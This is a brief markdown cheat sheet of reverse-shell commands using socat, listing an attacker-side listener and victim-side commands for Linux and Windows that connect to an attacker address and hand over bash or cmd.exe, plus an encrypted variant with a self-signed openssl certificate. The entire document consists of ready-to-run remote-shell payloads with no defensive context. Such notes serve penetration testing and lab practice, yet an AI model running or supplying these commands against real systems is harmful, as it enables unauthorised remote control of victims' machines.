# Reverse shell
## Socat<br>
**Attacker:** `socat -d -d TCP4-LISTEN:4443 STDOUT`<br>
**Victim:** `socat TCP4:192.168.0.107:4443 EXEC:/bin/bash`<br>
**Victim windows:** `socat TCP4:192.168.0.107:4443 EXEC:'cmd.exe',pipes`<br>

## Encrypted reverse shell
Create certificate: 
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -subj '/CN=www.doston.net/O=My Company Name LTD./C=US' -out bind.crt
```
**Attacker:** `socat -d -d OPENSSL-LISTEN:4443,cert=bind.pem,verify=0,fork STDOUT`<br>
**Victim:** `socat OPENSSL:192.168.0.107:4443,verify=0 EXEC:/bin/bash`<br>
**Victim Windows:** `socat OPENSSL:192.168.0.107:4443,verify=0 EXEC:'cmd.exe',pipes`<br>
